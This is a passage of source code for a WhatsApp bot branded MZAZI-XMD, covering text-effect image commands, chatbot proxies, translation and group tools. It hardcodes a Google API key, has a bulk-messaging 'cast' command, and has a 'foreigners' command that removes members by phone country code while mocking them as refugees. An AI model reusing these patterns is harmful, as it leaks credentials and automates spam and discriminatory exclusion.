      m.reply("Example Usage : " + prefix + "Metallic Mzazi");
      return;
    }
     try {
    var _0x29a9n6e5 = await mumaker.ephoto("https://en.ephoto360.com/impressive-decorative-3d-metal-text-effect-798.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a9n6e5.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d0734) {
    m.reply(_0x180d0734);
  }
}
	break; 
	      case 'ice': {
		      var mumaker = require("mumaker");
		     if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Ice Mzazi");
      return;
    }
     try {
    var _0x295 = await mumaker.ephoto("https://en.ephoto360.com/ice-text-effect-online-101.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x295.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d) {
    m.reply(_0x180d);
  }
}
	break; 
	      case 'snow': {
		      var mumaker = require("mumaker");
		     if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Snow Mzazi");
      return;
    }
     try {
    var _029a96e5 = await mumaker.ephoto("https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _029a96e5.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0180d034) {
    m.reply(_0180d034);
  }
}
	break;
	      case 'impressive': {
		      var mumaker = require("mumaker");
		     if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "impressive Nick");
      return;
    }
     try {
    var _0x29a96em5 = await mumaker.ephoto("https://en.ephoto360.com/create-3d-colorful-paint-text-effect-online-801.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a96em5.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x18d034) {
    m.reply(_0x18d034);
  }
}
	break; 
	      case 'noel': {
		      var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Noel myself");
    return;
  } 
  try {
	
  var hunte = await mumaker.ephoto("https://en.ephoto360.com/noel-text-effect-online-99.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: hunte.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch(_0x29df9) {
    m.reply("💀💀" + _0x29df9);
  }
}
	 break;
	      case 'water':{
		      var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Water myself");
    return;
  } 
  try {
	
  var hunterr = await mumaker.ephoto("https://en.ephoto360.com/create-water-effect-text-online-295.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: hunterr.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch(_0x9ddf9) {
    m.reply("💀💀" + _0x9ddf9);
  }
}
	 break;
	      case 'matrix':{
		      var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Matrix myself");
    return;
  } 
  try {
	
  var hunteer = await mumaker.ephoto("https://en.ephoto360.com/matrix-text-effect-154.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: hunteer.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch(_0x29ddf8) {
    m.reply("💀💀" + _0x29ddf8);
  }
}
	 break;
	      case 'light': {
		      var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Light myself");
    return;
  } 
  try {
	
  var hunteqr = await mumaker.ephoto("https://en.ephoto360.com/light-text-effect-futuristic-technology-style-648.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: hunteqr.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch(_0x29ddf4) {
    m.reply("💀💀" + _0x29ddf4);
  }
}
	 break;
	      case 'neon':{
		var mumaker = require("mumaker");
		     if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Neon Mzazi");
      return;
    }
     try {
    var _0x29a96e5 = await mumaker.ephoto("https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a96e5.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d034) {
    m.reply(_0x180d034);
  }
}
	break; 
	      case 'silver': case 'silva': {
		      var mumaker = require("mumaker");
		          if (!text || text == " ") {
      m.reply("Example Usage : " + prefix + "Silva Mzazi");
      return;
    }
     try {
    var _0x2996e = await mumaker.ephoto("https://en.ephoto360.com/create-glossy-silver-3d-text-effect-online-802.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x2996e.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d3) {
    m.reply(_0x180d3);
  }
}
	break;
	      case 'devil':{
		      var mumaker = require("mumaker");
		          if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Devil Mzazi");
      return;
    }
     try {
    var _0x9a96e = await mumaker.ephoto("https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x9a96e.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x80d03) {
    m.reply(_0x80d03);
  }
}
	break;
	      case 'typography': {
		      var mumaker = require("mumaker");
		          if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Typography Mzazi");
      return;
    }
     try {
    var _0x29a996e = await mumaker.ephoto("https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a996e.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d063) {
    m.reply(_0x180d063);
  }
}
	break;
	      case 'purple': {
		 var mumaker = require("mumaker");
		      if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "purple Mzazi");
      return;
    }
     try {
    var _0x29a96e = await mumaker.ephoto("https://en.ephoto360.com/purple-text-effect-online-100.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a96e.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d03) {
    m.reply(_0x180d03);
  }
}
	break;
	      case 'thunder':{
		      var mumaker = require("mumaker"); 
		      if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Thunder Mzazi");
      return;
    }
	try {
    var _0x29a96 = await mumaker.ephoto("https://en.ephoto360.com/thunder-text-effect-online-97.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x29a96.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    });
  } catch (_0x180d0) {
    m.reply(_0x180d0);
  }
}
  break;
	case 'leaves': {
		     var mumaker = require("mumaker"); 
		      if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "Leaves RAVEN-BOT");
      return;
    }
	try {
    var _0x14192dl = await mumaker.ephoto("https://en.ephoto360.com/green-brush-text-effect-typography-maker-online-153.html", text);
    m.reply("Wait a moment...");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x14192dl.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x24de3) {
    m.reply(_0x24de3);
  }
}
	break;
	      case '1917': {
		     var mumaker = require("mumaker"); 
		      if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "1917 Mzazi");
      return;
    }
	try {
    var _0x14192 = await mumaker.ephoto("https://en.ephoto360.com/1917-style-text-effect-523.html", text);
    m.reply("Wait a moment...");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x14192.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x24de3dl) {
    m.reply(_0x24de3dl);
  }
}
	break;
	      case 'arena': {
		     var mumaker = require("mumaker"); 
		      if (!text || text == "") {
      m.reply("Example Usage : " + prefix + "arena MZAZI-XMD");
      return;
    }
	try {
    var _0x14192d = await mumaker.ephoto("https://en.ephoto360.com/create-cover-arena-of-valor-by-mastering-360.html", text);
    m.reply("Wait a moment...");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x14192d.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x24de3d) {
    m.reply(_0x24de3d);
  }
}
	break;
	      case 'hacker': {
		      var mumaker = require("mumaker");
		      if (!text || text == "") {
    m.reply("Example usage :  " + prefix + "hacker Mzazi");
    return;
  }
  try {
    let _0x4086bb = await mumaker.ephoto("https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x4086bb.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x503c5f) {
    m.reply("🥵🥵 " + _0x503c5f);
  }
}
	break;
	      case 'sand': {
	 var mumaker = require("mumaker");
		      if (!text || text == "") {
    m.reply("Example Usage : " + prefix + "sand Raven");
    return;
  }
  try {
    let _0x4959e5 = await mumaker.ephoto("https://en.ephoto360.com/write-names-and-messages-on-the-sand-online-582.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x4959e5.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x593c10) {
    m.reply("🚫🚫 " + _0x593c10);
  }
}
	break;
	      case 'dragonball': {
	var mumaker = require("mumaker");	      
    if (!text || text == "") {
      m.reply("Example usage :  " + prefix + "dragonball Mzazi");
      return;
    }
      try {
    const _0x26f3ed = await mumaker.ephoto("https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html", text);
     m.reply("*Wait a moment...*")
    await client.sendMessage(m.chat, {
      image: {
        url: _0x26f3ed.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x553773) {
    m.reply("🥵🥵 " + _0x553773);
  }
}
	 break;
	      case 'naruto': {
		var mumaker = require("mumaker");      
		      if (!text || text == "") {
      m.reply("Example usage : " + prefix + "naruto Mzazi");
      return;
    }
    try {
    var _0x357389 = await mumaker.ephoto("https://en.ephoto360.com/naruto-shippuden-logo-style-text-effect-online-808.html", text);
 m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x357389.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x564fe1) {
    m.reply("🥵🥵 " + _0x564fe1);
  }
}
	  break;
	      case 'graffiti': {
		    var mumaker = require("mumaker");  
		      if (!text || text == "") {
    m.reply("Example usage : " + prefix + "graffiti Mzazi");
    return;
  }
  try {
    let _0x57ef84 = await mumaker.ephoto("https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: _0x57ef84.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x27e2e5) {
    m.reply("🥵🥵 " + _0x27e2e5);
  }
}
	 break;
	      case 'cat': {
		   var mumaker = require("mumaker");
		  if (!text || text == "") { m.reply("Example usage : * " + prefix + "cat Mzazi");
    return;
  }
  try {
    let nick = await mumaker.ephoto("https://en.ephoto360.com/handwritten-text-on-foggy-glass-online-680.html", text);
    m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: nick.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch (_0x27e2e5) {
    m.reply("🥵🥵 " + _0x27e2e5);
  }
    }
        break;
	      case 'gold': {
	    var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Gold myself");
    return;
  } 
  try {
	
  var hunter = await mumaker.ephoto("https://en.ephoto360.com/modern-gold-4-213.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: hunter.image
      },
      caption: `GENERATED BY MZAZI-XMD`
    }, {
      quoted: m
    });
  } catch(_0x29ddf9) {
    m.reply("💀💀" + _0x29ddf9);
  }
}
	 break;
		      case 'child': {
	    var mumaker = require("mumaker");
		     
		      if (!text || text == "") {
    m.reply("Example usage: " + prefix + "Child Mzazi");
    return;
  } 
  try {
	
  var tumba = await mumaker.ephoto("https://en.ephoto360.com/write-text-on-wet-glass-online-589.html", text);
m.reply("*Wait a moment...*");
    await client.sendMessage(m.chat, {
      image: {
        url: tumba.image
      },
      caption: `GENERATED BY 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
    }, {
      quoted: m
    });
  } catch(_0x29ddf) {
    m.reply("💀💀" + _0x29ddf);
  }
	    }
		break;
		      
	      case "Dommie":
		{
        if (!text) return reply(`Hello I'm 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗔𝗜. How can i help u?`);
          let d = await fetchJson(
            `https://bk9.fun/ai/llama?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
      }
                break;
		      case "gpt2":
		{
        if (!text) return reply(`What's your question ?`);
          let d = await fetchJson(
            `https://bk9.fun/ai/jeeves-chat?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
      }
                break;
	      
	      case 'trt': case 'translate':{
  	try {
        // Ensure that there is a language code and text to translate
        const args = text.split(' ');
        if (args.length < 2) {
            return m.reply(" Please provide a language code and text to translate !");
        }

        // Extract the language code and the text to translate
        const targetLang = args[0];  // First part is the language code
        const textToTranslate = args.slice(1).join(' ');  // Join the rest as the text to translate

        // Fetch data from the translation API
        const response = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(textToTranslate)}&langpair=en|${targetLang}`);

        // Check if the response is ok
        if (!response.ok) {
            return m.reply('Failed to fetch data. Please try again later.');
        }

        // Parse the response JSON
        const data = await response.json();

        // Check if the translation is available in the response
        if (!data.responseData || !data.responseData.translatedText) {
            return m.reply('No translation found for the provided text.');
        }

        // Extract the translated text
        const translatedText = data.responseData.translatedText;

        // Prepare the message to send
        const message = ` ${translatedText}`;

        // Send the translated message back to the user
        await client.sendMessage(m.chat, { text: message }, { quoted: m });

    } catch (error) {
        console.error("Error occurred:", error);
        m.reply('An error occurred while fetching the data. Please try again later.\n' + error);
    }
}
    break;
		      case 'antidelete': {
    try {
        // Enable or disable anti-delete feature
        if (!m.isGroup) return m.reply("This feature is only for groups!");

        let chatId = m.chat;
        let isEnabled = global.antiDeleteGroups?.includes(chatId);

        if (args[0] === "on") {
            if (isEnabled) return m.reply("Anti-Delete is already enabled!");
            global.antiDeleteGroups.push(chatId);
            m.reply("✅ Anti-Delete has been enabled!");
        } else if (args[0] === "off") {
            if (!isEnabled) return m.reply("Anti-Delete is already disabled!");
            global.antiDeleteGroups = global.antiDeleteGroups.filter(id => id !== chatId);
            m.reply("❌ Anti-Delete has been disabled!");
        } else {
            m.reply("Usage: *antidelete on* or *antidelete off*");
        }
    } catch (error) {
        console.error("Error in Anti-Delete:", error);
        m.reply("An error occurred while processing your request.");
    }
}
	break;
		      case 'cast': {
    if (!Owner) throw NotOwner;
      if (!m.isGroup) throw group;
    if (!text) return m.reply(`provide a text to cast !`);
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    m.reply(`Success in casting the message to contacts\n\nDo not always use this Command to avoid WA-bans ! `);
    for (let pler of mem) {
    client.sendMessage(pler, { text: q})
     }  
     m.reply(`Casting completed successfully😁`)
      }
      break;
		      
	      case "img": case "ai-img": case "image": case "images":{
		      var gis = require('g-i-s');
		      if (!text) return m.reply("Provide a text");

    try {
        // Use the 'text' as the search term for images
        gis(text, async (error, results) => {
            if (error) {
                return m.reply("An error occurred while searching for images.\n" + error);
            }

            // Check if results are found
            if (results.length === 0) {
                return m.reply("No images found.");
            }

            // Limit the number of images to send (e.g., 5)
            const numberOfImages = Math.min(results.length, 5);
            const imageUrls = results.slice(0, numberOfImages).map(result => result.url);

            // Send the images
            const messages = imageUrls.map(url => ({
                image: { url },
                caption: `Downloaded by ${botname}`
            }));

            for (const message of messages) {
                await client.sendMessage(m.chat, message, { quoted: m });
            }
        });
    } catch (e) {
        m.reply("An error occurred.\n" + e);
    }
}
	break;
		      
	      case "foreigners": {
	if (!m.isGroup) throw group;	      
	if (!isAdmin) throw admin;
	if (!isBotAdmin) throw botAdmin;
		      
		let _0x2f8982 = participants.filter(_0x3c9d8b => !_0x3c9d8b.admin).map(_0x1db3fb => _0x1db3fb.id).filter(_0x475052 => !_0x475052.startsWith(mycode) && _0x475052 != client.decodeJid(client.user.id));
    if (!args || !args[0]) {
      if (_0x2f8982.length == 0) {
        return m.reply("No foreigners detected.");
      }
      let _0x2d7d67 = `𝑭𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒂𝒓𝒆 𝒕𝒉𝒐𝒔𝒆 𝒈𝒖𝒚𝒔 𝒘𝒉𝒐𝒔𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝒄𝒐𝒅𝒆 𝒊𝒔 𝒏𝒐𝒕 ${mycode}. 𝑻𝒉𝒆 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔  ${_0x2f8982.length} 𝒐𝒓 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒘𝒆𝒓𝒆 𝒅𝒆𝒕𝒆𝒄𝒕𝒆𝒅:- \n`;
      for (let _0x28761c of _0x2f8982) {
        _0x2d7d67 += `𓅂 @${_0x28761c.split("@")[0]}\n`;
      }
      _0x2d7d67 += `\n𝑻𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒕𝒉𝒆𝒎 𝒔𝒆𝒏𝒅 foreigners -x`;
      client.sendMessage(m.chat, {
        text: _0x2d7d67,
        mentions: _0x2f8982
      }, {
        quoted: m
      });
    } else if (args[0] == "-x") {
      setTimeout(() => {
        client.sendMessage(m.chat, {
          text: `𝑴𝒛𝒂𝒛𝒊 𝒘𝒊𝒍𝒍 𝒏𝒐𝒘 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 ${_0x2f8982.length} 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔/𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔 𝒇𝒓𝒐𝒎 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒄𝒉𝒂𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝒈𝒐𝒐𝒅𝒃𝒚𝒆. 𝑻𝒉𝒊𝒔 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒄𝒂𝒏 𝒏𝒐𝒕 𝒃𝒆 𝒕𝒆𝒓𝒎𝒊𝒏𝒂𝒕𝒆𝒅😂⚠️\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`
        }, {
          quoted: m
        });
        setTimeout(() => {
          client.groupParticipantsUpdate(m.chat, _0x2f8982, "remove");
          setTimeout(() => {
            m.reply("𝑨𝒏𝒚 𝒓𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓, 𝒓𝒂𝒊𝒔𝒆 𝒚𝒐𝒖𝒓 𝒉𝒂𝒏𝒅𝒔?🌚😂.");
          }, 1000);
        }, 1000);
      }, 1000);
    }
  }
	break;
	      case 'dalle': case 'createimage': {
  if (!text) return m.reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`);
  try {
  	m.reply('Please wait, i am generating your image...')
    const endpoint = `https://www.arch2devs.ct.ws/api/fluxaws?query=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await client.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
    } else {
      throw '*Aarrhhhg Image generation failed*';
    }
  } catch {
    m.reply('Oops! Something went wrong while generating your image. Please try again later.')
  }
		      }
		 break;
		      case "ai": {
			      const {
    GoogleGenerativeAI: _0x817910
  } = require("@google/generative-ai");
  const _0xc0423b = require("axios");
		      
  try {
    if (!m.quoted) {
      return m.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵!");
    }
    if (!text) {
      return m.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗔𝗶, 𝘂𝘀𝗶𝗻𝗴 𝗴𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
    }
    if (!/image/.test(mime)) {
      return m.reply("𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗮𝗴 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵 !");
    }
    let _0x3439a2 = await client.downloadAndSaveMediaMessage(m.quoted);
    let _0x3dfb7c = await uploadtoimgur(_0x3439a2);
    m.reply("𝗔 𝗺𝗼𝗺𝗲𝘁, 𝗹𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗜𝗺𝗮𝗴𝗲...");
    const _0x4e9e6a = new _0x817910("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
    async function _0x309a3c(_0x1400ed, _0x1a081e) {
      const _0x53e4b2 = {
        responseType: "arraybuffer"
      };
      const _0x1175d9 = await _0xc0423b.get(_0x1400ed, _0x53e4b2);
      const _0x2a4862 = Buffer.from(_0x1175d9.data).toString("base64");
      const _0x2f6e31 = {
        data: _0x2a4862,
        mimeType: _0x1a081e
      };
      const _0x14b65d = {
        inlineData: _0x2f6e31
      };
      return _0x14b65d;
    }
    const _0x22a6bb = {
      model: "gemini-1.5-flash"
    };
    const _0x42849d = _0x4e9e6a.getGenerativeModel(_0x22a6bb);
    const _0x2c743f = [await _0x309a3c(_0x3dfb7c, "image/jpeg")];
    const _0xcf53e3 = await _0x42849d.generateContent([text, ..._0x2c743f]);
    const _0x195f9c = await _0xcf53e3.response;
    const _0x3db5a3 = _0x195f9c.text();
    await m.reply(_0x3db5a3);
  } catch (_0x4b3921) {
    m.reply("I am unable to analyze images at the moment\n" + _0x4b3921);
  }
}
 break;
	      case "ai2": {
		const axios = require("axios");

try {

if (!m.quoted) return m.reply("Send the image then tag it with the instruction.");

if (!text) return m.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 Mzazi AI 𝗨𝘀𝗲 𝗚𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");



   if (!/image/.test(mime)) return m.reply("That is not an image, try again while quoting an actual image.");             

let fdr = await client.downloadAndSaveMediaMessage(m.quoted)


                    let fta = await uploadtoimgur(fdr)
                    m.reply("𝗔 𝗠𝗼𝗺𝗲𝗻𝘁, 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗[𝗠𝗭𝗔𝗭𝗜-𝗔𝗜] 𝗶𝘀 𝗮𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");


const data = await fetchJson(`https://api.dreaded.site/api/gemini-vision?url=${fta}&instruction=${text}`);

let res = data.result

await m.reply(res);

  

} catch (e) {

m.reply("I am unable to analyze images at the moment\n" + e)

}
	      }
		break;
	      case "vision": {
		      if (!msgDreaded || !text) {
    m.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝗮𝗻𝗱 𝗴𝗶𝘃𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵. 𝗜'𝗺 𝗠𝗭𝗔𝗭𝗜 𝗔𝗶, 𝗶 𝘂𝘀𝗲 𝗕𝗮𝗿𝗱 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
    return;
  }
  ;
  let _0x44b3e0;
  if (msgDreaded.imageMessage) {
    _0x44b3e0 = msgDreaded.imageMessage;
  } else {
    m.reply("𝗛𝘂𝗵, 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲, 𝗦𝗲𝗻𝗱 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘁𝗵𝗲𝗻 𝘁𝗮𝗴 𝗶𝘁 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 !");
    return;
  }
  ;
  try {
    let _0x11f50e = await client.downloadAndSaveMediaMessage(_0x44b3e0);
    let _0x45392d = await uploadtoimgur(_0x11f50e);
    m.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗟𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");
    let _0x4f137e = await (await fetch("https://bk9.fun/ai/geminiimg?url=" + _0x45392d + "&q=" + text)).json();
    const _0x4bfd63 = {
      text: _0x4f137e.BK9
    };
    await client.sendMessage(m.chat, _0x4bfd63, {
      quoted: m
    });
  } catch (_0x1be711) {
    m.reply("An error occured\n" + _0x1be711);
  }
}
	 break;
		      case 'remini': {
			if (!quoted) return reply(`𝗪𝗵𝗲𝗿𝗲 𝗶𝘀 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 ?`)
